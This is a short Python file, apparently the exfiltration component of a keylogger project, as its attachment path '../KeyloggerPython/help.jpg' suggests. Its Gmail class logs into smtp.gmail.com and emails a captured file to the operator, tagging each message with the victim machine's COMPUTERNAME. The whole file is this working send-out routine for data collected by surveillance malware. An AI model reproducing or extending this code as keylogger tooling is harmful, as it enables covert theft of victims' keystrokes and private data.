import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os


class Gmail:
    def mail(self, email, password, filepath):
        fromaddr = email
        toaddr = email
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = str(os.environ['COMPUTERNAME'])
        body = "Hi, find the attachment"
        msg.attach(MIMEText(body, 'plain'))
        filename = "../KeyloggerPython/help.jpg"
        attachment = open(filepath, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" %filename)
        msg.attach(p)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, email, text)
        server.quit()
